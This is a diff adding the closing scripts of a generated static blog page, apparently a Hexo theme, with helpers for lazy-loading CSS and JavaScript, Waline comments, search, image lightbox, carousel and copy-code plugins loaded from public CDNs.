+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
